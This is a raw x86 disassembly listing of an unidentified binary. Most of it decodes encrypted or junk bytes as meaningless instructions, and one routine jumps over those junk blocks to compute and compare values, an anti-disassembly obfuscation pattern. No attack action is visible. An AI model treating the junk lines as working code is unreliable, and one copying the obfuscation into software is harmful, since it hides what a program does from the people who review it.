  410bd8:	aam    0x3d
  410bda:	adc    eax,DWORD PTR [edi]
  410bdc:	jp     0x410ba4
  410bde:	ins    DWORD PTR es:[edi],dx
  410bdf:	enter  0x2707,0x74
  410be3:	in     eax,dx
  410be4:	leave  
  410be5:	outs   dx,BYTE PTR ds:[esi]
  410be6:	repnz dec edi
  410be8:	mov    bh,0x2b
  410bea:	cmp    al,0xc4
  410bec:	xor    DWORD PTR [edi+0x1fea160c],0x23b5ae32
  410bf6:	fsub   st,st(5)
  410bf8:	sub    BYTE PTR [edi-0x2b417006],ah
  410bfe:	dec    eax
  410bff:	pushf  
  410c00:	adc    dh,bh
  410c02:	ds xchg ebp,eax
  410c04:	sbb    DWORD PTR [eax-0x3],ebx
  410c07:	mov    eax,ds:0xfead5fc7
  410c0c:	mov    esp,0x9a9d1ae5
  410c11:	xor    eax,0x3f81ca10
  410c16:	pop    esi
  410c17:	pop    edx
  410c18:	std    
  410c19:	and    al,0x3c
  410c1b:	sub    bl,al
  410c1d:	pushf  
  410c1e:	mov    ebp,0x69cfde4
  410c23:	ss push ecx
  410c25:	out    dx,al
  410c26:	enter  0x4838,0x87
  410c2a:	fist   DWORD PTR [edx]
  410c2c:	inc    esp
  410c2d:	mov    al,0x22
  410c2f:	sbb    ah,BYTE PTR [edx+edx*1+0xdd3cac8]
  410c36:	das    
  410c37:	gs ret 
  410c39:	sub    al,0x83
  410c3b:	xor    edx,ebx
  410c3d:	daa    
  410c3e:	or     BYTE PTR [ebp-0x1dfee40b],cl
  410c44:	xchg   ebx,eax
  410c45:	sahf   
  410c46:	sar    BYTE PTR [eax+0x183f6741],cl
  410c4c:	push   ds
  410c4d:	ja     0x410c29
  410c4f:	cmp    al,0xf8
  410c51:	std    
  410c52:	push   esi
  410c53:	ficomp WORD PTR [edx-0x19]
  410c56:	jnp    0x410c34
  410c58:	and    bl,cl
  410c5a:	fcom   QWORD PTR [ebx+ebx*4]
  410c5d:	add    al,0xb5
  410c5f:	into   
  410c60:	(bad)  
  410c61:	cli    
  410c62:	jmp    0x410ccf
  410c64:	dec    edi
  410c65:	sbb    DWORD PTR [esi],0xcbf7370e
  410c6b:	inc    esp
  410c6c:	mov    edi,0x1e378f05
  410c71:	push   edx
  410c72:	mov    esi,0x86e109aa
  410c77:	inc    ecx
  410c78:	popf   
  410c79:	xor    DWORD PTR [ebx+edx*8-0x4],esi
  410c7d:	xabort 0xc9
  410c80:	fsub   DWORD PTR [edi-0x3b]
  410c83:	repz pop ebx
  410c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c86:	std    
  410c87:	aaa    
  410c88:	lods   al,BYTE PTR ds:[esi]
  410c89:	pop    esp
  410c8a:	push   ebx
  410c8b:	mov    eax,ds:0x23478c06
  410c90:	mov    ah,0x46
  410c92:	stos   DWORD PTR es:[edi],eax
  410c93:	adc    dl,BYTE PTR [ebx]
  410c95:	out    0xbc,eax
  410c97:	mov    WORD PTR [edi+0x4927e683],ss
  410c9d:	ins    BYTE PTR es:[edi],dx
  410c9e:	aam    0xaa
  410ca0:	mul    DWORD PTR [esi+0x74]
  410ca3:	mov    gs,WORD PTR [esi]
  410ca5:	xlat   BYTE PTR ds:[ebx]
  410ca6:	cmc    
  410ca7:	push   es
  410ca8:	sahf   
  410ca9:	adc    ah,BYTE PTR [ecx-0x4c]
  410cac:	(bad)  
  410cad:	daa    
  410cae:	sahf   
  410caf:	cmp    DWORD PTR [esp+ebx*2-0x52],0xc4bce230
  410cb7:	cmp    edx,DWORD PTR [edx+0x7cd3583d]
  410cbd:	mov    ecx,?
  410cbf:	mov    cl,0x65
  410cc1:	jle    0x410cde
  410cc3:	fmulp  st(3),st
  410cc5:	jg     0x410d1f
  410cc7:	sub    bh,BYTE PTR [ecx-0x6b]
  410cca:	into   
  410ccb:	fwait
  410ccc:	pop    ecx
  410ccd:	aas    
  410cce:	mov    al,cs:0xb7ee2c85
  410cd4:	inc    edx
  410cd5:	dec    ebp
  410cd6:	cmc    
  410cd7:	and    ebx,ecx
  410cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cda:	sti    
  410cdb:	hlt    
  410cdc:	xor    esp,DWORD PTR [ebx+0x3939bd59]
  410ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ce3:	retf   
  410ce4:	cwde   
  410ce5:	sbb    DWORD PTR [esi+0x5a],ebp
  410ce8:	int3   
  410ce9:	mov    ebp,es
  410ceb:	sub    al,0xda
  410ced:	cli    
  410cee:	xor    al,0x71
  410cf0:	mov    ds:0x15007845,al
  410cf5:	mov    al,0xdb
  410cf7:	dec    ebp
  410cf8:	addr16 adc al,0xa2
  410cfb:	in     eax,dx
  410cfc:	inc    edi
  410cfd:	rol    DWORD PTR [edx-0x15],cl
  410d00:	jnp    0x410ce3
  410d02:	pop    ebp
  410d03:	mov    esp,0x71e1070b
  410d08:	sbb    esi,DWORD PTR [ebx]
  410d0a:	mov    cs,WORD PTR [ebx+0x5e]
  410d0d:	leave  
  410d0e:	pop    eax
  410d0f:	sti    
  410d10:	jmp    0x410d12
  410d12:	test   al,0x31
  410d14:	push   0x87664491
  410d19:	(bad)  [esi+ecx*4]
  410d1c:	xchg   ebx,eax
  410d1d:	xlat   BYTE PTR cs:[ebx]
  410d1f:	mov    cl,BYTE PTR ds:0x76f87839
  410d25:	push   ebp
  410d26:	and    al,0x8b
  410d28:	push   ebp
  410d29:	mov    ecx,0xdd12e45
  410d2e:	jp     0x410d77
  410d30:	addr16 push esp
  410d32:	addr16 jnp 0x410d63
  410d35:	mov    bh,BYTE PTR [edi]
  410d37:	xor    DWORD PTR [edi+0x7c],edx
  410d3a:	sub    ecx,DWORD PTR [eax+ebp*2]
  410d3d:	jmp    0x410d7e
  410d3f:	inc    esi
  410d40:	fst    st(3)
  410d42:	mov    edi,0xeeef02a6
  410d47:	int3   
  410d48:	mov    BYTE PTR [ebx],bl
  410d4a:	jo     0x410ce1
  410d4c:	cmc    
  410d4d:	ins    DWORD PTR es:[edi],dx
  410d4e:	jge    0x410d8d
  410d50:	mov    al,ds:0x44f5b738
  410d55:	dec    esi
  410d56:	push   edi
  410d57:	mov    ch,0xfc
  410d59:	inc    esi
  410d5a:	nop
  410d5b:	inc    eax
  410d5c:	call   0xcc95abb5
  410d61:	sbb    eax,0x9475bc90
  410d66:	mov    al,0xea
  410d68:	adc    DWORD PTR [edi-0x49],ebp
  410d6b:	jecxz  0x410d53
  410d6d:	jge    0x410d71
  410d6f:	scas   eax,DWORD PTR es:[edi]
  410d70:	mov    ecx,0x4e29365f
  410d75:	cmp    DWORD PTR [esi+ecx*2-0x3d],edx
  410d79:	repnz add DWORD PTR [ebx-0x32],esi
  410d7d:	cmp    esi,ebp
  410d7f:	test   al,0x91
  410d81:	xor    eax,0xdc2e05a7
  410d86:	adc    eax,DWORD PTR [edx]
  410d88:	pop    ebp
  410d89:	shl    BYTE PTR [ecx-0x49],1
  410d8c:	and    BYTE PTR [ebp-0x6406c644],cl
  410d92:	jo     0x410d51
  410d94:	pop    ebx
  410d95:	popf   
  410d96:	imul   edi,DWORD PTR [ebp-0x5e],0xffffffdc
  410d9a:	pusha  
  410d9b:	mov    bl,0xb9
  410d9d:	mov    dl,0x18
  410d9f:	sbb    DWORD PTR [ebx-0x56d5ed6d],ebp
  410da5:	push   edi
  410da6:	ret    
  410da7:	adc    al,0xba
  410da9:	inc    esp
  410daa:	xlat   BYTE PTR ds:[ebx]
  410dab:	dec    ebx
  410dac:	fistp  WORD PTR [ebx-0x71]
  410daf:	ret    0x62ed
  410db2:	sub    ch,ch
  410db4:	ins    DWORD PTR es:[edi],dx
  410db5:	rcr    BYTE PTR [edi],0x9d
  410db8:	xor    eax,0xbdea5dd2
  410dbd:	push   ecx
  410dbe:	in     al,0x86
  410dc0:	(bad)  
  410dc1:	xlat   BYTE PTR ds:[ebx]
  410dc2:	inc    edx
  410dc3:	and    ch,bl
  410dc5:	inc    esi
  410dc6:	and    al,0xd6
  410dc8:	add    ecx,ecx
  410dca:	cs push cx
  410dcd:	mov    bl,0xec
  410dcf:	pushf  
  410dd0:	ja     0x410d95
  410dd2:	pushf  
  410dd3:	adc    eax,DWORD PTR [eax+0x2aeb2a44]
  410dd9:	call   0xe53fb0b6
  410dde:	lock jge 0x410e00
  410de1:	wbinvd 
  410de3:	mul    DWORD PTR [esi+0x14f13363]
  410de9:	call   0x5b04:0x508971a9
  410df0:	leave  
  410df1:	ret    0x8
  410df4:	push   ebp
  410df5:	mov    ebp,esp
  410df7:	sub    esp,0x3c
  410dfa:	mov    DWORD PTR [ebp-0x20],0x3510
  410e01:	mov    DWORD PTR [ebp-0x1c],0x2104
  410e08:	mov    DWORD PTR [ebp-0x18],0x5d15
  410e0f:	mov    DWORD PTR [ebp-0x14],0x30cd
  410e16:	mov    DWORD PTR [ebp-0x10],0x1709
  410e1d:	mov    DWORD PTR [ebp-0xc],0x260b
  410e24:	jmp    0x4110ab
  410e29:	jo     0x410db5
  410e2b:	fldl2e 
  410e2d:	cmp    al,0xb9
  410e2f:	jo     0x410dcd
  410e31:	out    0x46,eax
  410e33:	mov    ah,BYTE PTR [esp+edi*1+0x3b90dd8d]
  410e3a:	dec    edx
  410e3b:	mov    esi,0xbec289be
  410e40:	mov    esi,0xc44b375f
  410e45:	sahf   
  410e46:	xchg   ebx,eax
  410e47:	ror    DWORD PTR [ebx],0x93
  410e4a:	es adc esi,edx
  410e4d:	nop
  410e4e:	aam    0xd7
  410e50:	call   0xaa522ec
  410e55:	daa    
  410e56:	pop    ecx
  410e57:	mov    eax,ds:0x50a81d72
  410e5c:	shr    BYTE PTR [eax-0xc],cl
  410e5f:	mov    ds:0x490decb4,eax
  410e64:	fdiv   QWORD PTR [eax-0x5c0ea830]
  410e6a:	scas   eax,DWORD PTR es:[edi]
  410e6b:	test   BYTE PTR [ebp+0x66f81096],0xfd
  410e72:	push   ecx
  410e73:	loop   0x410edf
  410e75:	shr    dh,0x23
  410e78:	xor    eax,0x40
  410e7b:	sbb    DWORD PTR [ebx-0x7ac937b3],esi
  410e81:	jl     0x410ef0
  410e83:	pop    ds
  410e84:	in     al,dx
  410e85:	clc    
  410e86:	push   ds
  410e87:	inc    ecx
  410e88:	lods   al,BYTE PTR ds:[esi]
  410e89:	popa   
  410e8a:	repnz jmp 0x157c:0x95adfd98
  410e92:	daa    
  410e93:	adc    eax,0xeb719892
  410e98:	fsub   st,st(5)
  410e9a:	outs   dx,DWORD PTR ds:[esi]
  410e9b:	adc    eax,0x30714522
  410ea0:	adc    bl,BYTE PTR ds:0x2da969f1
  410ea6:	sub    dl,0xd0
  410ea9:	and    DWORD PTR [ebx+0x7e],0x7bb6a8e9
  410eb0:	push   ebp
  410eb1:	pushf  
  410eb2:	addr16 enter 0x7537,0x4b
  410eb7:	fstp   st(6)
  410eb9:	bound  esp,QWORD PTR [edi]
  410ebb:	or     ch,BYTE PTR [edx+0x48]
  410ebe:	inc    edx
  410ebf:	in     al,0x51
  410ec1:	adc    al,0xe1
  410ec3:	dec    esi
  410ec4:	jno    0x410f0a
  410ec6:	lods   al,BYTE PTR ds:[esi]
  410ec7:	inc    eax
  410ec8:	xchg   ebp,eax
  410ec9:	neg    DWORD PTR ds:0x854807d1
  410ecf:	sub    BYTE PTR [ebp+0x79],dh
  410ed2:	sahf   
  410ed3:	sbb    eax,0x4c95d6c9
  410ed8:	jmp    0xc546d522
  410edd:	test   DWORD PTR [esi+0x74],0xe1282078
  410ee4:	retf   0xb3a3
  410ee7:	cwde   
  410ee8:	mov    al,ds:0x8091fd31
  410eed:	mov    dh,0x52
  410eef:	fild   WORD PTR [ebx-0x5d]
  410ef2:	mov    edi,DWORD PTR [ebx-0x2cf7454e]
  410ef8:	xlat   BYTE PTR ds:[ebx]
  410ef9:	pop    ebx
  410efa:	dec    edi
  410efb:	pop    edi
  410efc:	mov    BYTE PTR ds:[ebx],bl
  410eff:	sub    al,0x13
  410f01:	xchg   BYTE PTR [edi-0x51b92983],bl
  410f07:	push   ecx
  410f08:	popf   
  410f09:	bound  esp,QWORD PTR [edi+edx*4]
  410f0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f0d:	into   
  410f0e:	mov    eax,0x549b2e5a
  410f13:	pop    esi
  410f14:	mov    ch,0x1a
  410f16:	pop    ds
  410f17:	in     al,0xb4
  410f19:	jecxz  0x410f1d
  410f1b:	push   ss
  410f1c:	jg     0x410ef8
  410f1e:	imul   esi,DWORD PTR [eax+ecx*4-0x6a592b05],0x13a52a51
  410f29:	and    eax,0x8f1ad703
  410f2e:	sahf   
  410f2f:	sub    eax,0x7765f8ec
  410f34:	icebp  
  410f35:	ins    BYTE PTR es:[edi],dx
  410f36:	xlat   BYTE PTR ds:[ebx]
  410f37:	xchg   BYTE PTR [ebx-0x49],dh
  410f3a:	mov    dh,0x3e
  410f3c:	sbb    eax,0xa584700e
  410f41:	outs   dx,BYTE PTR ds:[esi]
  410f42:	or     BYTE PTR [eax-0x6c],ah
  410f45:	cwde   
  410f46:	or     BYTE PTR [eax-0x71],bh
  410f49:	sbb    dh,BYTE PTR [ecx+0xd]
  410f4c:	shl    BYTE PTR [eax],0x49
  410f4f:	lea    edx,[esi]
  410f51:	or     esi,DWORD PTR [edi]
  410f53:	xchg   ecx,eax
  410f54:	enter  0x16b7,0xf
  410f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f59:	xor    esp,esi
  410f5b:	fldenv [ecx]
  410f5d:	jmp    0x5f316c48
  410f62:	mov    ecx,0xc4c58a2f
  410f67:	fcmovbe st,st(3)
  410f69:	dec    ebp
  410f6a:	adc    eax,0x7a298260
  410f6f:	daa    
  410f70:	scas   al,BYTE PTR es:[edi]
  410f71:	outs   dx,BYTE PTR ds:[esi]
  410f72:	retf   0xf00d
  410f75:	jp     0x410fda
  410f77:	push   ecx
  410f78:	fld    TBYTE PTR [edi+0x47]
  410f7b:	mov    ds:0x8bb45696,al
  410f80:	sbb    ebx,DWORD PTR [edx]
  410f82:	jp     0x410f74
  410f84:	loope  0x410f16
  410f86:	jge    0x410f16
  410f88:	pop    edi
  410f89:	mov    al,ds:0x6fb9d37c
  410f8e:	pop    esp
  410f8f:	cwde   
  410f90:	cmp    DWORD PTR [esi-0xd],0x71678bc8
  410f97:	dec    ecx
  410f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f99:	sub    al,0xc4
  410f9b:	shl    DWORD PTR [esi],cl
  410f9d:	and    dl,al
  410f9f:	call   0xd1f:0xe58c23a4
  410fa6:	(bad)  
  410fa7:	jg     0x410fec
  410fa9:	xchg   edx,eax
  410faa:	rcl    BYTE PTR [edx+0x32cc755b],cl
  410fb0:	mov    esi,0x5a77eed3
  410fb5:	adc    al,0xdd
  410fb7:	cld    
  410fb8:	imul   eax,DWORD PTR [eax-0x70],0x724c9039
  410fbf:	les    ebx,FWORD PTR [ebx]
  410fc1:	cwde   
  410fc2:	jo     0x410ff1
  410fc4:	ret    0x120
  410fc7:	or     ebx,DWORD PTR [ebx+0x4b63542c]
  410fcd:	mov    al,0x55
  410fcf:	mov    ch,0xc6
  410fd1:	cdq    
  410fd2:	div    DWORD PTR [ebx+0x665c13fa]
  410fd8:	jne    0x37e0e463
  410fde:	cmp    al,0x42
  410fe0:	nop
  410fe1:	xchg   edi,eax
  410fe2:	jmp    0x1fbb0f31
  410fe7:	pop    esi
  410fe8:	pop    esi
  410fe9:	or     eax,0x2b8e1371
  410fee:	sbb    al,0x14
  410ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ff1:	inc    eax
  410ff2:	lods   eax,DWORD PTR ds:[esi]
  410ff3:	pushf  
  410ff4:	popa   
  410ff5:	sub    eax,DWORD PTR [ecx+0x57]
  410ff8:	sbb    edi,esi
  410ffa:	pop    edx
  410ffb:	fsubr  DWORD PTR [ebx+0x648cc02e]
  411001:	fcomp  st(2)
  411003:	mov    ds:0x94b7c6c3,eax
  411008:	or     al,0x43
  41100a:	pop    ebx
  41100b:	dec    eax
  41100c:	cdq    
  41100d:	fiadd  WORD PTR [edi+0x4c]
  411010:	mov    ch,bh
  411012:	repnz outs dx,DWORD PTR ds:[esi]
  411014:	gs mov esi,esp
  411017:	in     al,dx
  411018:	aam    0x71
  41101a:	or     ebx,DWORD PTR [edx-0x2ce99346]
  411020:	lods   eax,DWORD PTR ds:[esi]
  411021:	mov    ?,ebx
  411023:	sbb    edx,DWORD PTR [edx]
  411025:	xor    DWORD PTR [ecx-0x1c],edx
  411028:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411029:	iret   
  41102a:	and    ah,BYTE PTR [edi]
  41102c:	(bad)  
  41102d:	sub    dl,dl
  41102f:	fwait
  411030:	imul   edi,ebx,0x40ecd9e
  411036:	hlt    
  411037:	and    al,0x33
  411039:	(bad)  
  41103a:	inc    DWORD PTR [ecx]
  41103c:	and    DWORD PTR [eax],ecx
  41103e:	jae    0x41105f
  411040:	inc    edx
  411041:	push   esi
  411042:	xchg   ecx,eax
  411043:	push   es
  411044:	in     eax,0xda
  411046:	cmp    al,0xc6
  411048:	push   ebx
  411049:	outs   dx,BYTE PTR ds:[esi]
  41104a:	fstp   QWORD PTR [edi]
  41104c:	jno    0x411039
  41104e:	mov    ebx,DWORD PTR [ebx+0x234b8f26]
  411054:	loop   0x411025
  411056:	aas    
  411057:	adc    edi,DWORD PTR ds:0xf34a27ac
  41105d:	inc    esp
  41105e:	test   edx,ebx
  411060:	jo     0x4110bb
  411062:	in     eax,0x1b
  411064:	mov    ah,0x8d
  411066:	test   al,0x3b
  411068:	les    eax,FWORD PTR [ebp-0x7]
  41106b:	shl    BYTE PTR [edx+0x4bd99aae],cl
  411071:	sub    bl,bh
  411073:	stos   BYTE PTR es:[edi],al
  411074:	fsub   DWORD PTR [eax+ebp*8-0x54670090]
  41107b:	aam    0xd6
  41107d:	mov    ds:0x51bc3c08,eax
  411082:	mov    ebp,DWORD PTR [esp+ebp*8+0xed6231d]
  411089:	mov    esp,0x9afe61b8
  41108e:	jle    0x411014
  411090:	mov    cl,0x3c
  411092:	ins    BYTE PTR es:[edi],dx
  411093:	(bad)  
  411094:	sub    edi,DWORD PTR [ecx]
  411096:	cs and al,0x87
  411099:	cmc    
  41109a:	daa    
  41109b:	mov    bl,BYTE PTR [ecx+0xc]
  41109e:	call   0x1ad8b080
  4110a3:	cmp    eax,0x9d1cc28d
  4110a8:	fwait
  4110a9:	xchg   BYTE PTR [eax],cl
  4110ab:	mov    DWORD PTR [ebp-0x8],0x3204
  4110b2:	mov    DWORD PTR [ebp-0x4],0x62ea
  4110b9:	mov    DWORD PTR [ebp-0x38],0x58e9
  4110c0:	jmp    0x411347
  4110c5:	pop    edx
  4110c6:	daa    
  4110c7:	fcomp  QWORD PTR [eax-0x44]
  4110ca:	mov    esp,0xf3ba2b5a
  4110cf:	aad    0xe3
  4110d1:	imul   esi,DWORD PTR [esp+esi*8-0x41b1f731],0xffffffbe
  4110d9:	mov    edx,eax
  4110db:	mov    esi,0x8fa19ebe
  4110e0:	ret    
  4110e1:	pushf  
  4110e2:	mov    BYTE PTR [ebp+0x42845e81],dh
  4110e8:	pop    ebx
  4110e9:	jnp    0x4110d2
  4110eb:	or     dh,al
  4110ed:	int    0x0
  4110ef:	cli    
  4110f0:	jae    0x411171
  4110f2:	js     0x4110de
  4110f4:	fisubr WORD PTR [eax+0x7a7fef39]
  4110fa:	(bad)  
  4110fb:	lock jge 0x41107e
  4110fe:	mov    ch,0x4d
  411100:	int    0x8d
  411102:	jl     0x411179
  411104:	mov    ds:0x83c73823,al
  411109:	aad    0x4c
  41110b:	cmp    al,0xcd
  41110d:	jecxz  0x411116
  41110f:	ins    DWORD PTR es:[edi],dx
  411110:	fstp   TBYTE PTR [esi+0x7dc502c8]
  411116:	jl     0x411125
  411118:	stc    
  411119:	sub    dl,bh
  41111b:	xor    BYTE PTR [ecx+0x5721db72],cl
  411121:	dec    esp
  411122:	xchg   edi,eax
  411123:	or     BYTE PTR [edx],ah
  411125:	bound  esp,QWORD PTR gs:[edx-0x3f]
  411129:	call   0x13e5:0x56419547
  411130:	sar    bl,1
  411132:	mov    dl,0xa0
  411134:	aam    0x10
  411136:	mov    dh,0xff
  411138:	outs   dx,DWORD PTR ds:[esi]
  411139:	jns    0x411178
  41113b:	cwde   
  41113c:	stos   BYTE PTR es:[edi],al
  41113d:	inc    ecx
  41113e:	jge    0x4111b3
  411140:	in     al,0x26
  411142:	dec    eax
  411143:	mov    eax,0xfae16887
  411148:	rcr    DWORD PTR [edi],0xb4
  41114b:	inc    ebx
  41114c:	pop    ebp
  41114d:	bound  esp,QWORD PTR [eax+edx*4]
  411150:	ins    DWORD PTR es:[edi],dx
  411151:	idiv   BYTE PTR [ebx+0x33694416]
  411157:	xchg   DWORD PTR [edi+0x4e],ecx
  41115a:	mov    ebx,0xac693392
  41115f:	icebp  
  411160:	jo     0x4111ce
  411162:	jnp    0x411177
  411164:	test   al,0xa
  411166:	adc    BYTE PTR [eax-0xf],bh
  411169:	int3   
  41116a:	jp     0x41112f
  41116c:	mov    ecx,0xa98f2d05
  411171:	mov    eax,0xa4cc2d29
  411176:	sbb    cl,BYTE PTR [ebx+0x7e]
  411179:	push   ds
  41117a:	leave  
  41117b:	test   dl,0x4a
  41117e:	push   esp
  41117f:	inc    ebx
  411180:	dec    eax
  411181:	dec    esi
  411182:	mov    ebp,0x340e5e07
  411187:	mov    WORD PTR [eax-0xa2d76],?
  41118d:	sub    eax,0xead7446c
  411192:	mov    bl,0x62
  411194:	inc    ecx
  411195:	cdq    
  411196:	xchg   edi,esp
  411198:	fdiv   QWORD PTR [eax+0x1dbcd384]
  41119e:	out    0xb9,al
  4111a0:	icebp  
  4111a1:	dec    ebp
  4111a2:	xlat   BYTE PTR ds:[ebx]
  4111a3:	test   DWORD PTR [edx+edx*2],eax
  4111a6:	fcomp  QWORD PTR [edx+0xb8b79f4]
  4111ac:	ins    BYTE PTR es:[edi],dx
  4111ad:	std    
  4111ae:	push   0xd4f1c95
  4111b3:	mov    dl,0xf
  4111b5:	lahf   
  4111b6:	push   cs
  4111b7:	aaa    
  4111b8:	clc    
  4111b9:	pop    ebp
  4111ba:	adc    eax,0x531ea234
  4111bf:	lea    esi,[edx+0x18]
  4111c2:	pop    es
  4111c3:	dec    ebp
  4111c4:	lahf   
  4111c5:	(bad)  [edi]
  4111c7:	jbe    0x4111c3
  4111c9:	outs   dx,DWORD PTR ds:[esi]
  4111ca:	rol    DWORD PTR [eax+0x45],1
  4111cd:	jo     0x4111a2
  4111cf:	mov    esp,0x1b88748
  4111d4:	(bad)  
  4111d5:	xor    BYTE PTR [eax+0x7238a648],ch
  4111db:	scas   al,BYTE PTR es:[edi]
  4111dc:	sub    al,0xf7
  4111de:	pop    ebp
  4111df:	cmp    al,0x9c
  4111e1:	inc    esi
  4111e2:	and    ebp,edi
  4111e4:	iret   
  4111e5:	jbe    0x411236
  4111e7:	add    BYTE PTR [ebp-0x69],cl
  4111ea:	inc    ebp
  4111eb:	jno    0x411235
  4111ed:	push   ss
  4111ee:	popf   
  4111ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111f0:	outs   dx,BYTE PTR ds:[esi]
  4111f1:	(bad)  
  4111f3:	mov    ds,edi
  4111f5:	call   0x5bf5:0x3e07cf1d
  4111fc:	add    bl,al
  4111fe:	jmp    0xe7e2:0xe890046e
  411205:	repnz pushf 
  411207:	xchg   esp,eax
  411208:	push   edx
  411209:	fwait
  41120a:	xor    BYTE PTR [ebp-0x48345e3a],bl
  411210:	dec    esp
  411211:	iret   
  411212:	adc    al,0x2d
  411214:	addr16 dec esp
  411216:	push   cs
  411217:	xchg   DWORD PTR [esi-0x7e],edi
  41121a:	sbb    BYTE PTR [ebx-0x45],0x41
  41121e:	pusha  
  41121f:	adc    cl,BYTE PTR [esi+0x36888ddf]
  411225:	test   DWORD PTR [esi+0x5],0x4b9f2cbb
  41122c:	repz std 
  41122e:	push   ebp
  41122f:	sbb    eax,edi
  411231:	das    
  411232:	retf   
  411233:	jl     0x411271
  411235:	mov    ebp,0xd1027b1c
  41123a:	dec    edi
  41123b:	ds clc 
  41123d:	sub    cl,BYTE PTR [edx-0x682e34eb]
  411243:	sub    al,0x46
  411245:	pop    eax
  411246:	ins    DWORD PTR es:[edi],dx
  411247:	push   esi
  411248:	sub    bl,BYTE PTR [esi-0x58]
  41124b:	imul   esp,DWORD PTR [edx+0xfa2609b],0x2b
  411252:	inc    ebx
  411253:	jno    0x411209
  411255:	loope  0x411211
  411257:	or     BYTE PTR [ebp+ecx*1-0xc],ah
  41125b:	hlt    
  41125c:	je     0x4111f5
  41125e:	aaa    
  41125f:	push   ebp
  411260:	sub    BYTE PTR [esi-0xb51c7f3],0xab
  411267:	loope  0x4112b8
  411269:	imul   ebx,DWORD PTR [esi-0x65],0xffffff97
  41126d:	mov    eax,ecx
  41126f:	bound  ebp,QWORD PTR [ebp-0x7bc8beda]
  411275:	jl     0x4112c0
  411277:	lahf   
  411278:	das    
  411279:	pushf  
  41127a:	jge    0x41126b
  41127c:	jne    0x41122a
  41127e:	imul   ecx,DWORD PTR [eax+ecx*2+0x26c00793],0xd296db2d
  411289:	push   0xe2e158f
  41128e:	(bad)  
  41128f:	stos   DWORD PTR es:[edi],eax
  411290:	add    al,0xd6
  411292:	jl     0x4112b4
  411294:	push   0x13
  411296:	jae    0x411263
  411298:	push   eax
  411299:	add    ecx,DWORD PTR [edi]
  41129b:	sbb    edx,ebx
  41129d:	pop    edx
  41129e:	imul   ebx,DWORD PTR [esi+0x17],0xffffffb8
  4112a2:	inc    edi
  4112a3:	aad    0x97
  4112a5:	repnz rcl eax,1
  4112a8:	outs   dx,DWORD PTR ds:[esi]
  4112a9:	add    ebx,DWORD PTR [ecx-0x3db279b7]
  4112af:	and    al,0x72
  4112b1:	test   al,0x8c
  4112b3:	out    0xb2,al
  4112b5:	syscall 
  4112b7:	mov    esi,0xdfb1ca9
  4112bc:	mov    ebx,0x12ac519b
  4112c1:	repz js 0x411264
  4112c4:	scas   eax,DWORD PTR es:[edi]
  4112c5:	fcomp  QWORD PTR [edi-0x6c]
  4112c8:	(bad)  
  4112c9:	mov    edx,0x4258b1c0
  4112ce:	int    0x7b
  4112d0:	and    ch,bl
  4112d2:	idiv   bl
  4112d4:	add    ah,cl
  4112d6:	cmp    ebx,DWORD PTR [esi]
  4112d8:	adc    eax,0x13e4059
  4112dd:	mov    bh,0xa
  4112df:	(bad)  
  4112e0:	rcr    DWORD PTR [esi-0xa],1
  4112e3:	sub    bl,cl
  4112e5:	mov    ebx,0x38b3d95f
  4112ea:	stos   BYTE PTR es:[edi],al
  4112eb:	std    
  4112ec:	scas   al,BYTE PTR es:[edi]
  4112ed:	ret    0xab9
  4112f0:	imul   edi,DWORD PTR [edx-0x73aef096],0xb686462
  4112fa:	or     eax,0x47d36a08
  4112ff:	aam    0x60
  411301:	jnp    0x411291
  411303:	test   al,0xbc
  411305:	inc    esp
  411306:	retf   
  411307:	or     eax,0xdf2e8b81
  41130c:	push   ecx
  41130d:	jg     0x4112f3
  41130f:	sahf   
  411310:	mov    eax,ds:0x7af8f879
  411315:	mov    ds:0x7c86f1e3,eax
  41131a:	mov    ?,WORD PTR ds:[edx+0x79]
  41131e:	pop    ds
  41131f:	(bad)  
  411320:	fst    DWORD PTR [eax-0x7cde6114]
  411326:	test   al,0xb9
  411328:	pop    edi
  411329:	push   ebp
  41132a:	call   0x9480d320
  41132f:	ins    DWORD PTR es:[edi],dx
  411330:	pop    ebp
  411331:	push   esi
  411332:	sub    eax,0xf1d42e2b
  411337:	in     al,dx
  411338:	mov    ch,0x20
  41133a:	adc    edx,eax
  41133c:	push   esi
  41133d:	adc    eax,0xb027cac1
  411342:	adc    DWORD PTR [edi-0x7c],0x45c7cbd2
  411349:	int3   
  41134a:	mov    DWORD PTR [edi+0x0],edi
  41134d:	add    bh,al
  41134f:	inc    ebp
  411350:	rcr    dl,1
  411352:	jg     0x411354
  411354:	add    bh,al
  411356:	inc    ebp
  411357:	aam    0x89
  411359:	sub    BYTE PTR [eax],al
  41135b:	add    bh,al
  41135d:	inc    ebp
  41135e:	fmul   DWORD PTR [edi]
  411360:	sldt   WORD PTR [eax]
  411363:	mov    DWORD PTR [ebp-0x24],0x58e1
  41136a:	mov    DWORD PTR [ebp-0x3c],0x69c
  411371:	mov    eax,DWORD PTR [ebp-0x10]
  411374:	mov    ecx,DWORD PTR [ebp-0x14]
  411377:	and    al,0xb9
  411379:	add    al,cl
  41137b:	mov    ecx,DWORD PTR [ebp-0x18]
  41137e:	and    al,cl
  411380:	mov    ecx,DWORD PTR [ebp-0x1c]
  411383:	sub    al,0x11
  411385:	and    al,cl
  411387:	mov    ecx,DWORD PTR [ebp-0x20]
  41138a:	mov    edx,DWORD PTR [ebp+0x8]
  41138d:	imul   ecx,ecx,0x6008
  411393:	add    ecx,0x1759dd6e
  411399:	add    al,0x4d
  41139b:	xor    ecx,0x2b4185ee
  4113a1:	cmp    BYTE PTR [ecx+edx*1],al
  4113a4:	jne    0x41143e
  4113aa:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ad:	mov    eax,0xffffeff8
  4113b2:	mov    edx,eax
  4113b4:	sub    edx,ecx
  4113b6:	add    edx,DWORD PTR [ebp-0x8]
  4113b9:	mov    ecx,DWORD PTR [ebp-0xc]
  4113bc:	or     edx,ecx
  4113be:	mov    ecx,DWORD PTR [ebp-0x4]
  4113c1:	imul   edx,edx,0x85300
  4113c7:	sub    eax,ecx
  4113c9:	add    eax,DWORD PTR [ebp-0x8]
